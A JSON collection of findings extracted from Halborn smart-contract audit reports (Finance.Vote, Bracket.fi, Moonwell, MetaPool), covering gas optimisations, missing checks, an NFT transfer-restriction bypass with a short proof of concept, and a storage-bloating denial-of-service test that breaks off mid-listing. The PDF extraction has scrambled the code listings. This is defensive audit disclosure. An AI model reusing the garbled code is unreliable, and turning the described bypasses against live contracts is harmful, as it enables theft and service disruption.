        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_BasicPoolFactory_Smart_Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Listing 14: BasicPoolFactory.sol (Lines ) 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 function addPool ( uint startTime , uint maxDeposit , uint [] memory rewardsPerSecondPerToken , uint programLengthDays , address depositTokenAddress , address [] memory rewardTokenAddresses ) public managementOnly { numPools = numPools . plus (1) ; Pool storage pool = pools [ numPools ]; pool . id = numPools ; pool . rewardsPerSecondPerToken = rewardsPerSecondPerToken ; pool . startTime = startTime > block . timestamp ? startTime : block . timestamp ; pool . endTime = startTime . plus ( programLengthDays * 1 days ); pool . depositToken = depositTokenAddress ; require ( rewardsPerSecondPerToken . length == rewardTokenAddresses . length , ' Rewards and reward token arrays must be same length '); for ( uint i = 0; i < rewardTokenAddresses . length ; i ++) { pool . rewardTokens . push ( rewardTokenAddresses [ i ]) ; pool . rewardsClaimed . push (0) ; 28 79 80 81 82 } } pool . maximumDeposit = maxDeposit ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remediation Plan: SOLVED: Finance.Vote Team marked function as an external. Listing 15: BasicPoolFactory.sol (Lines 60) 60 61 62 63 64 65 66 67 68 69 70 71 72 73 function addPool ( uint startTime , uint maxDeposit , uint [] memory rewardsPerSecondPerToken , uint programLengthDays , address depositTokenAddress , address [] memory rewardTokenAddresses ) external managementOnly { numPools = numPools . plus (1) ; Pool storage pool = pools [ numPools ]; pool . id = numPools ; pool . rewardsPerSecondPerToken = rewardsPerSecondPerToken ; pool . startTime = startTime > block . timestamp ? startTime : block . timestamp ; pool . endTime = startTime . plus ( programLengthDays * 1 days ); 29 74 75 76 77 78 79 80 81 82 83 84 pool . depositToken = depositTokenAddress ; require ( rewardsPerSecondPerToken . length == rewardTokenAddresses . length , ' Rewards and reward token arrays must be same length '); for ( uint i = 0; i < rewardTokenAddresses . length ; i ++) { pool . rewardTokens . push ( rewardTokenAddresses [ i ]) ; pool . rewardsClaimed . push (0) ; } pool . maximumDeposit = maxDeposit ; emit PoolAdded ( pool . id ); } 30 MANUAL TESTING 31 During the manual testing multiple questions where considered while evaluation each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can somehow an external controlled contract call again the function during the execution of it? (Re-entrancy)  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation..  Can an attacker withdraw multiple times?  Can we deposit more than allowed? 4.1 Access Control Test First of all, all contracts access control policies are evaluated. During the tests, the following functions are reachable by only management address. Listing 16 1 function addPool ( 2 3 4 5 6 7 8 uint startTime , uint maxDeposit , uint [] memory rewardsPerSecondPerToken , uint programLengthDays , address depositTokenAddress , address [] memory rewardTokenAddresses ) public managementOnly According to policies, No issues have been found on the dynamic analysis. Figure 1 32 G N I T S E T L A U N A M Figure 1: Testing Access Control Policy 4.2 Multiple Withdraw Test Then, The withdraw progress has been tested. The Halborn Team tried to manipulate withdraw progress. Figure 2 From the test results, It has been observed that the user could not withdraw multiple times from the pools. Next, Test cases ran on the contract functionalities. Multiple withdraw, owner checks are examined. Figure 3  Screenshots 33 G N I T S E T L A U N A M Figure 2: Example Pool Receipt G N I T S E T L A U N A M Figure 3: Multiple Withdraw Test 34 Figure 4: Receipt Owner Check 4.3 Reward Distribution Test Rewards test Test Code Listing 17 1 2 3 4 5 6 7 8 function calculateRewards ( uint startTime , uint endTime , uint rewardsPerSecondPerToken , uint amountDeposited ) public view returns ( uint ) { uint secondsDiff = endTime . minus ( startTime ); uint rewardsLocal ; rewardsLocal = ( secondsDiff . times ( rewardsPerSecondPerToken ). times ( amountDeposited )) / 1 e18 ; return rewardsLocal ; } 35 G N I T S E T L A U N A M Listing 18 1 Time Deposit Time - End Time - Rewards Per Token - Amount Deposits ( WEI ) - Reward - Date Difference 2 3 1624452848 - 1624452849 - 10 4 1624452848 - 1627034048 - 10 5 1624452848 - 1632390848 - 10 6 1624452848 - 1640253248 - 10 Month 7 1624452848 - 1655978048 - 10 8 - 1000000000000000 - 3 - 1 Second - 1000000000000000 - 25812 - 1 Month - 1000000000000000 - 79380 - 3 Month - 1000000000000000 - 158004 - 6 - 1000000000000000 - 315252 - 1 Year  Linear Graph G N I T S E T L A U N A M 36 4.4 Deposit Amount Test In that test case, Deposit amount is checked according to workflow. We tried to deposit to pool more than allowed. However, we are not successful for the manipulation. Figure 5: Deposit Amount Check G N I T S E T L A U N A M 37 ",
        "labels": [
            "Halborn",
            "Finance_Vote_BasicPoolFactory",
            "Severity: Informational"
        ]
    },
    {
        "title": "CLAIMED POLICIES CAN BE TRANSFERED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The transferFrom() function in the iBNFT.sol contract overrides the OpenZeppelins ERC721 function to implement checks that prevent a policy NFT from being transferred if the token ID is 0 or above the current ID and prevent the ownership transfer of policies that have been already claimed: Listing 1: iBNFT.sol (Line 83) 78 // Get a positive token price from a chainlink oracle 79 function transferFrom ( address from , 80 address to , 81 82 uint256 tokenId 83 ) whenNotPaused () nonReentrant () public override ( ERC721Upgradeable  , IERC721Upgradeable ) { 84  Policies [ tokenId ]. claimed , \" CLAIMED \"); 85 86 } require ( tokenId >= 1 && tokenId <= _tokenIds . current () && ! super . transferFrom ( from , to , tokenId ); However, the safeTransferFrom() function is not overridden. This allows a user to easily bypass this requirement by using the safeTransferFrom() function instead of transferFrom(). Proof of Concept:  User buys a policy and receives a NFT with token ID 1.  After policy expires, or the option is In-The-Money buyer claims the policy and funds are distributed accordingly.  User tries to transfer the policy to another user using the transferFrom() function iBNFTaddr.transferFrom(buyer1, accounts[3], 1, {'from': buyer1}) 14  Because policy is claimed transaction reverts.  User calls the safeTransferFrom() function instead. Effectively transferring the NFT ownership and bypassing the restriction. iBNFTaddr.safeTransferFrom(buyer1, accounts[3], 1, {'from': buyer1 }) Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to override the safeTransferFrom() function and add the same check on the iBNFT contract: Listing 2: iBNFT.sol address from , address to , uint256 tokenId 1 function safeTransferFrom ( 2 3 4 5 ) whenNotPaused () nonReentrant () public override ( ERC721Upgradeable  , IERC721Upgradeable ) { 6  Policies [ tokenId ]. claimed , \" CLAIMED \"); 7 8 } require ( tokenId >= 1 && tokenId <= _tokenIds . current () && ! super . safeTransferFrom ( from , to , tokenId ); Remediation Plan: SOLVED: The Bracket.fi team fixed the issue. Both safeTransferFrom functions, one with 3 and the other with 4 parameters, were overridden 15 in the iBNFT contract. Moreover, the requirements were transferred to the 4 safeTransferFrom arguments, while the remaining transfer functions call it internally. 16 ",
        "labels": [
            "Halborn",
            "Bracket_fi_BracketX",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF DISABLEINITIALIZERS CALL TO PREVENT UNINITIALIZED CONTRACTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Multiple contracts are using the Initializable module from OpenZeppelin. In order to prevent leaving an implementation contract uninitialized OpenZeppelins documentation recommends adding the _disableInitializers function in the constructor to lock the contracts automatically when they are deployed: Listing 3 * @dev Locks the contract , preventing any future reinitialization * Calling this in the constructor of a contract will prevent that * to any version . It is recommended to use this to lock * through proxies . */ 1 /* * 2  . This cannot be part of an initializer call . 3  contract from being initialized or reinitialized 4  implementation contracts that are designed to be called 5 6 7 function _disableInitializers () internal virtual { 8  initializing \"); 9 10 11 12 13 } _initialized = type ( uint8 ). max ; emit Initialized ( type ( uint8 ). max ); require (! _initializing , \" Initializable : contract is if ( _initialized < type ( uint8 ). max ) { } Risk Level: Likelihood - 1 Impact - 3 17 Recommendation: Consider calling the _disableInitializers function in the contract constructor: Listing 4 1 // / @custom : oz - upgrades - unsafe - allow constructor 2 constructor () { 3 4 } _disableInitializers () ; Remediation Plan: Bracket.fi team SOLVED: The _disableInitializers() Config, Offersx, PricingSequencer, iBNFT. the following fixed the to issue. contracts: Added the Bracketxl, 18 ",
        "labels": [
            "Halborn",
            "Bracket_fi_BracketX",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF PRICE FEED DECIMALS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The PricingSequencer contract contains the getLatestPrice() function to return the latest price from a given Chainlink price feed address. This is intended to be used with USDC pairs, which will return an 8 decimals price which is later on converted to 18 decimals by multiplying it by 1e10. However, a funder can create an offer sending an asset that would return an 18-decimals price; this would lead to the function returning a 28-decimals price. Listing 5: PricingSequencer.sol (Line 542) 526 function getLatestPrice ( address asset ) override public view  returns ( uint ) { 527 // TODO : Add the Sequencer offline check when moving to  production 528 529 530 531 // this is not supported on the testnet if ( checkSequencerState () ) { // If the sequencer is down , do not perform any critical  operations 532 revert ( \" L2 sequencer down : Chainlink feeds are not being  updated \" ); } 533 534 535 536 537 538 539 540 uint80 roundID , // // // // // AggregatorV2V3Interface priceFeed = AggregatorV2V3Interface ( int price , uint startedAt , uint timeStamp , uint80 answeredInRound  asset ); 541 542 543 } (, int price , ,,) = priceFeed . latestRoundData () ; return uint256 ( price ). mul (1 e10 ); 19 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Although the probability of this happening is reduced as the Bracket.fi team has confirmed that they are filtering the offers by asset on the front-end; Halborn recommends whitelisting the assets or checking the decimals of the provided price feed address. This could be done in the setOfferX() function of the Offersx contract, so no funder can set an offer that returns a price other than 8 decimals price. Remediation Plan: SOLVED: The Bracket.fi team fixed the issue by adding code to the setOfferX function in the Offersx contract that checks that oracle uses 8 decimals before setting an offer. Although the code is commented out like oracles, it cannot be tested in local environments. Comments should be removed before deploying to production. 20 ",
        "labels": [
            "Halborn",
            "Bracket_fi_BracketX",
            "Severity: Low"
        ]
    },
    {
        "title": "> 0 CONSUMES MORE GAS THAN != 0",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The use of > consumes more gas than !=. There are some cases where both can be used indistinctly, such as in unsigned integers where numbers cant be negative, and as such, there is only a need to check that a number is not 0. Code Location: Bracketx.sol - Line 244: assert(v.id > 0); - Line 376: if (v.addAvailUSDC > 0){ - Line 419: require((amountETH > 0 || amountUSDC > 0), \"BAL\"); - Line 420: if (amountETH > 0){ - Line 424: if (amountUSDC > 0){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: Use != instead of > in cases where both can be used. Remediation Plan: SOLVED: The Bracket.fi team fixed the issue by replacing > with != in the specified code. 21 ",
        "labels": [
            "Halborn",
            "Bracket_fi_BracketX",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSTFIX OPERATORS CONSUME MORE GAS THAN PREFIX OPERATORS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The use of postfix operators i++ consume more gas than prefix operators ++i. Code Location: Bracketx.sol - Line 397: for (uint tid = autoClaimPtr; tid <= maxId; tid++ ){ - Line 405: cnt++; Offersx.sol - Line 71: for (uint8 i; i < 12; i++){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use prefix operators rather than postfix. Remediation Plan: SOLVED: The Bracket.fi team fixed the issue by replacing the postfix with prefix operators. 22 ",
        "labels": [
            "Halborn",
            "Bracket_fi_BracketX",
            "Severity: Informational"
        ]
    },
    {
        "title": "INCREMENTS CAN BE UNCHECKED IN LOOPS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Most of the solidity for loops use an uint256 variable counter that increments by 1 and starts at 0. These increments dont need to be checked for over/underflow because the variable will never reach the max capacity of uint256 as it would run out of gas long before that happens. Code Location: Bracketx.sol - Line 397: for (uint tid = autoClaimPtr; tid <= maxId; tid++ ){ - Line 405: cnt++; Offersx.sol - Line 71: for (uint8 i; i < 12; i++){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to uncheck the increments in for loops to save gas. For example, instead of: Listing 6: BracketX.sol 397 for ( uint tid = autoClaimPtr ; tid <= maxId ; tid ++ ) { 398 399 } // Code to be run It could be used to save gas: 23 Listing 7: BracketX.sol 397 for ( uint tid = autoClaimPtr ; tid <= maxId ;) { 398 399 } unchecked { ++ tid ; } Remediation Plan: SOLVED: The Bracket.fi team fixed the issue by unchecking increments in for loops. 24 ",
        "labels": [
            "Halborn",
            "Bracket_fi_BracketX",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It has been detected that constructors or initializing functions of many smart contracts are missing address validation. For example: Listing 8: Bracketx.sol (Lines 96-100) 85 function initialize ( address _ibnft , 86 address _usdc , 87 address _pricing , 88 address _offers , 89 address _config 90 91 ) external initializer { 92 93 94 95 96 97 98 99 100 101 102 } __Ownable_init () ; __ReentrancyGuard_init () ; __Pausable_init () ; ibnft = _ibnft ; usdc = _usdc ; pricing = _pricing ; offers = _offers ; config = _config ; autoClaimPtr = 1; // first nft is 1 not 0. Every input address should be checked not to be zero, especially the ones that could lead to rendering the contract unusable, lock tokens, etc. This is considered a best practice. Code Location: Bracketx.sol - Line 85-102: initialize() iBNFT.sol - Line 40-42: setBrkt() 25 Offersx.sol - Line 39-46: initialize() Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to validate that each address inputs in the constructor and other critical functions are non-zero. Remediation Plan: SOLVED: The Bracket.fi team fixed the issue by implementing non-zero address requirements in the initialized function of contracts. 26 MANUAL TESTING 27 Halborn performed several manual tests in the following contracts:  BracketX.sol  Config.sol  iBNFT.sol  PricingSequencer.sol  Offersx.sol  StructLibx.sol The manual tests were focused on testing the main functions of these contracts:  addAvailable()  reduceAvailable()  buyPolicy()  claim()  autoClaim()  checkVer()  addVer()  transferFrom()  mintNFTinsured()  getOffer()  setOfferx()  getLatestPrice()  checkSequencerState()  multFactor() No issues were found during the manual tests. 28 G N I T S E T L A U N A M ",
        "labels": [
            "Halborn",
            "Bracket_fi_BracketX",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Safety_Module_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Safety Module contracts have address fields on multiple functions. These functions have missing address validations. Every address should be validated and checked that is different from zero. This is also considered a best practice. During the test, it has seen some of these inputs are not protected against using the address(0) as the target address. Code Location: Listing 1: StakedToken.sol (Lines 50,58) IERC20 stakedToken , IERC20 rewardToken , uint256 cooldownSeconds , uint256 unstakeWindow , address rewardsVault , address emissionManager , uint128 distributionDuration , string memory name , string memory symbol , uint8 decimals , address governance 44 function __StakedToken_init ( 45 46 47 48 49 50 51 52 53 54 55 56 57 58  distributionDuration ); 59 60 61 62 63 64 65 stakedToken , rewardToken , cooldownSeconds , unstakeWindow , rewardsVault , governance __StakedToken_init_unchained ( ) internal initializer { __ERC20_init_unchained ( name , symbol , decimals ); __DistributionManager_init_unchained ( emissionManager , 13 66 67 ); } Listing 2: EcosystemReserve.sol (Line 32) 31 function initialize ( address reserveController ) external  initializer { 32 33 _setFundsAdmin ( reserveController ); } Listing 3: EcosystemReserve.sol (Line 52) 51 function setFundsAdmin ( address admin ) external override  onlyFundsAdmin { 52 53 _setFundsAdmin ( admin ); } Recommendation: It is recommended to validate that every address input is different from zero. Remediation Plan: SOLVED: Moonwell Finance team solved this issue by adding multiple zero address checks to the code. Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e 14 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Safety_Module",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING REENTRANCY GUARD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Safety_Module_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "To protect against cross-function re-entrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against re-entrancy attacks. Code Location: Listing 4: EcosystemReserve.sol IERC20 token , address recipient , uint256 amount 43 function transfer ( 44 45 46 47 48 49 } ) external override onlyFundsAdmin { token . transfer ( recipient , amount ); Listing 5: StakedToken.sol 85 function stake ( address onBehalfOf , uint256 amount ) external  override { 86 87 88 require ( amount != 0 , ' INVALID_ZERO_AMOUNT '); require ( onBehalfOf != address (0) , ' STAKE_ZERO_ADDRESS '); uint256 balanceOfUser = balanceOf ( onBehalfOf ); Listing 6: StakedToken.sol 114 function redeem ( address to , uint256 amount ) external override { require ( amount != 0 , ' INVALID_ZERO_AMOUNT '); 115 require ( to != address (0) , ' REDEEM_ZERO_ADDRESS '); 116 // solium - disable - next - line 117 15 118 uint256 cooldownStartTimestamp = stakersCooldowns [ msg .  sender ]; Listing 7: StakedToken.sol 161 function claimRewards ( address to , uint256 amount ) external  override { 162 163 164 165 166 uint256 newTotalRewards = _updateCurrentUnclaimedRewards ( msg . sender , balanceOf ( msg . sender ) , false ); Risk Level: Likelihood - 2 Impact - 2 Recommendation: The functions on the code location section have missing nonReentrant modifiers. It is recommended to add OpenZeppelin ReentrancyGuard library to the project and use the nonReentrant modifier to avoid introducing future re-entrancy vulnerabilities. Remediation Plan: SOLVED: This issue was solved by implementing nonReentrant modifier to specified functions above. Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e 16 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Safety_Module",
            "Severity: Low"
        ]
    },
    {
        "title": "USE 1E18 CONSTANT FOR GAS OPTIMIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Safety_Module_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It is In Solidiy, exponentiation operation (**) costs up to 10 gas. possible to consume less gas to calculate token prices if DECIMAL variable is fixed. Code Location: Listing 8: DistributionManager.sol 201 return principalUserBalance . mul ( reserveIndex . sub ( userIndex )) . div  (10** uint256 ( PRECISION )) ; Listing 9: DistributionManager.sol 232 emissionPerSecond . mul ( timeDelta ). mul (10** uint256 ( PRECISION )) . div (  totalBalance ). add ( currentIndex ); Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use 1e18 instead of (10 ** 18) on price calculations to optimize gas usage. Remediation Plan: SOLVED: Moonwell Finance team solved this issue by using 1e18 instead of (10 ** PRECISION) on the code. 17 Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e Example PoC: Listing 10: Gas Usage Comparison 1 pragma solidity 0.8.7; 2 contract Null { 3 4 5 6 7 8 9 10 } } constructor () {} function test () public view returns ( uint256 ) { return 10 ** 18; // gas usage : 21407 } function test2 () public view returns ( uint256 ) { return 1 e18 ; // gas usage : 21379 18 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Safety_Module",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE ++I INSTEAD OF I++ IN LOOPS FOR GAS OPTIMIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Safety_Module_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In all the loops, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. This also affects variables incremented inside the loop code block. Code Location: Listing 11: DistributionManager.sol 48 for ( uint256 i = 0; i < assetsConfigInput . length ; i ++) { 49  assetsConfigInput [ i ]. underlyingAsset ]; AssetData storage assetConfig = assets [ Listing 12: DistributionManager.sol _updateUserAssetInternal ( accruedRewards = accruedRewards . add ( 146 for ( uint256 i = 0; i < stakes . length ; i ++) { 147 148 149 150 151 152 153 154 user , stakes [ i ]. underlyingAsset , stakes [ i ]. stakedByUser , stakes [ i ]. totalStaked ); ) Listing 13: DistributionManager.sol 173 for ( uint256 i = 0; i < stakes . length ; i ++) { 174 AssetData storage assetConfig = assets [ stakes [i ].  underlyingAsset ]; 175 176 177 uint256 assetIndex = _getAssetIndex ( assetConfig . index , assetConfig . emissionPerSecond , 19 178 179 180 ); assetConfig . lastUpdateTimestamp , stakes [ i ]. totalStaked Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This also applies to the variables declared inside the for loop, not just the iterator. On the other hand, this is not applicable outside of loops. Remediation Plan: team SOLVED: post-increment to pre-increment. Moonwell Finance solved this issue by replacing Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e 20 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Safety_Module",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE IMMUTABLE KEYWORD FOR GAS OPTIMIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Safety_Module_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The immutable keyword was added to Solidity in 0.6.5. State variables can be marked immutable which causes them to be read-only, but only assignable in the constructor. The following state variables are missing the immutable modifier:  STAKED_TOKEN  REWARD_TOKEN  COOLDOWN_SECONDS There are no setter functions to change values of variables above. If these variables do not need to be changed, they should be defined with immutable keyword. Code Location: Listing 14: StakedToken.sol 23 IERC20 public STAKED_TOKEN ; 24 IERC20 public REWARD_TOKEN ; 25 uint256 public COOLDOWN_SECONDS ; 26 27 // / @notice Seconds available to redeem once the cooldown period  is fulfilled 28 uint256 public UNSTAKE_WINDOW ; Risk Level: Likelihood - 1 Impact - 1 21 Recommendation: It is recommended to add the immutable modifier to the state variables mentioned to save some gas. Remediation Plan: NOT APPLICABLE: Immutable variables can only be initialized inline or assigned directly in the constructor. In this finding, there is no Attempting to explicit constructor in initializable smart contracts. set the immutable keyword for variables specified above may break their operation. 22 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Safety_Module",
            "Severity: Informational"
        ]
    },
    {
        "title": "DENIAL OF SERVICE CONDITION DUE TO STORAGE BLOATING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the MetaPool contract does not require a storage deposit from users to cover fees associated with storing stNEAR balance. Additionally, it is possible to send tokens to the previously unseen user, in such a scenario, the contract will reserve storage for the newly The contract will be deducting NEAR to free balance to created user. cover the storage fees. However, if a contract will not have a sufficient free balance, it will cause the transaction to fail and all subsequent attempts at increasing the storage usage will fail until the contracts free balance is increased. Hence, it is possible for a malicious user to create multiple accounts and use them as receivers for token transfers with small value. Sufficient number of such transactions will bloat the contracts storage, leading to a Denial Of Service condition regarding creating new balances, which will directly impact the staking process - core functionality of the contract. It is worth noting that this vulnerability does not impact token transfers among users who have already saved balances, and the Denial Of Service condition can be reverted by sending more NEAR tokens to the MetaPool contract. Code Location: Listing 1: metapool/src/internal.rs (Line 565) & mut self , sender_id : & AccountId , receiver_id : & AccountId , amount : u128 , 553 pub fn internal_st_near_transfer ( 554 555 556 557 558 ) { 559 560 561 assert_ne! ( sender_id , receiver_id , \" Sender and receiver should be different \" 19 562 563 564 565  ; 566 567 568 569 570 571 572 573 ); assert! ( amount > 0, \" The amount should be a positive number \"); let mut sender_acc = self . internal_get_account (& sender_id ); let mut receiver_acc = self . internal_get_account (& receiver_id ) assert! ( amount <= sender_acc . stake_shares , \" @ {} not enough stNEAR balance {} \" , sender_id , sender_acc . stake_shares ); let near_amount = self . amount_from_stake_shares ( amount ); //  amount is in stNEAR ( aka shares ) , let ' s compute how many nears that  is - for acc . staking_meter 574 575 576 577 578 579 } sender_acc . sub_stake_shares ( amount , near_amount ); receiver_acc . add_stake_shares ( amount , near_amount ); self . internal_update_account (& sender_id , & sender_acc ); self . internal_update_account (& receiver_id , & receiver_acc ); Listing 2: metapool/src/internal.rs (Line 438) 438 pub ( crate ) fn internal_get_account (& self , account_id : & String ) ->  Account { self . accounts . get ( account_id ). unwrap_or_default () 439 440 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:C/D:N/Y:N/R:P/S:U (5.0) Proof Of Concept: Please note that this Proof Of Concept uses an add_tokens_to function that is not present in the actual contract. It was added as a helper to create a state with balances to shorten the execution time of the test case. Its definition is as follows: 20 Listing 3: metapool/src/lib.rs (Line 361) 361 pub fn add_tokens_to (& mut self , account_id : AccountId ) { 362 363 364 365 } let mut account = self . internal_get_account (& account_id ); account . add_stake_shares (10000000000000000000 , 100000000000) ; self . internal_update_account (& account_id , & account ); Listing 4: src/halborn_testcases/storage_bloating.rs let get_epoch_wasm = std :: fs :: read ( GET_EPOCH_CONTRACT_PATH ) ?; let user_count = 6; let metapool_wasm = std :: fs :: read ( LIQUID_STAKING_CONTRACT_PATH let owner = root_account let staking_pool_wasm = std :: fs :: read ( let worker = workspaces :: sandbox () . await ?; let root_account = worker . root_account () ?; . create_subaccount (\" contract - owner \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; 39 #[ tokio :: test ] 40 async fn storage_bloating () -> anyhow :: Result <() > { 41 42  ) ?; 43  STAKING_POOL_CONTRACT_PATH ) ?; 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 . create_subaccount (\" treasury \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; . create_subaccount (\" operator \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let meta_token = root_account let operator = root_account let treasury = root_account . create_subaccount (\" meta_token_contract_account \" ) . initial_balance (199999999999999900000000000) . transact () 21 let metapool = root_account . create_subaccount (\" metapool \" ) . initial_balance (5000000000000000000000000) // 5 NEAR to let get_epoch_acc = root_account . create_subaccount (\" get_epoch_acc \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let mut user_accounts = Vec :: with_capacity ( user_count ); for n in 0.. user_count { let this_user_account = root_account . create_subaccount (& user_account_name (n )) . initial_balance (19999999999999990000000000000) . transact () . await ? . into_result () ?; user_accounts . push ( this_user_account ); . await ? . into_result () ?; . transact () . await ? . into_result () ?; 71 72 73 74 75  expedite execution 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97  . await ?. into_result () ?; 98 99 100 101 102 103 104 105 get_epoch_contract } . call ( \" new \") . args_json ( json! ({}) ) . transact () . await ? . into_result () ?; let get_epoch_contract = get_epoch_acc . deploy (& get_epoch_wasm ) let metapool_contract = metapool . deploy (& metapool_wasm ). await  ?. into_result () ?; 106 107 108 109 110 111 metapool_contract . call ( \" new \") . args_json ( json! ({ \" owner_account_id \": owner . id () , \" treasury_account_id \": treasury . id () , \" operator_account_id \": operator . id () , 22 \" meta_token_account_id \" : meta_token . id () , }) ) . transact () . await ? . into_result () ?; let mut sp_contracts = Vec :: with_capacity (4) ; let mut set_staking_pools_arg = Vec :: with_capacity (4) ; let weights_vec : Vec < u8 > = vec! [15 , 16 , 20 , 49]; for n in 0..=3 { let staking_pool_n = root_account . create_subaccount (& sp_contract_name ( n)) . initial_balance (19999999999999990000000000000) . transact () . await ? . into_result () ?; let staking_pool_contract_n = staking_pool_n . deploy (& staking_pool_wasm ) . await ? . into_result () ?; staking_pool_contract_n . call ( \" new \" ). args_json ( json! ({ 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 \" owner_id \" : owner . id () , \" stake_public_key \": \"  Di8H4S8HSwSdwGABTGfKcxf1HaVzWSUKVH1mYQgwHCWb \" , 135 \" reward_fee_fraction \": RewardFeeFraction { numerator :  5, denominator : 100} 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 }) ); owner . call ( metapool_contract . id () , \" add_staking_pool \" ) . args_json ( json! ({ \" account_id \" : staking_pool_contract_n . id () , }) ) . transact () . await ? . into_result () ?; let this_arg = StakingPoolArgItem { account_id : staking_pool_contract_n . id () . clone () , weight_basis_points : weights_vec [ n ] as u16 * 100 , }; set_staking_pools_arg . push ( this_arg ); sp_contracts . push ( staking_pool_contract_n ); } 23 154 155 156 157 158 159 160 161 162 163 owner . call ( metapool_contract . id () , \" set_staking_pools \" ) . args_json ( json! ({ \" list \": set_staking_pools_arg }) ) . deposit (1) . transact () . await ? . into_result () ?; // Note : This function was added as a helper to shorten the  execution of the test case 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 // It is not present in the actual contract user_accounts [0] 